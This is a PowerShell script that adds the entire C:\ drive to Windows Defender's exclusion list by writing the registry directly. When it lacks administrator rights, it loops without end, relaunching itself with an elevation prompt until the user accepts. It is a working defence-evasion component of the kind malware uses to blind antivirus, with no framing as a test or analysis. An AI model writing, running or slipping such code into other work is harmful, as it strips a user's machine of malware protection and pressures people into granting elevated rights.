$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    # Use registry instead of Set-MpPreference
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\" -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    Write-Host "Exclusion added via registry" -ForegroundColor Green
    pause
    exit
}

while ($true) {
    try {
        $args = "-Command `"New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths' -Name 'C:\' -Value 0 -PropertyType DWORD -Force; pause`""
        $p = Start-Process PowerShell -ArgumentList $args -Verb RunAs -PassThru
        if ($p) { exit }
    }
    catch {
        Start-Sleep -Milliseconds 100
    }
}
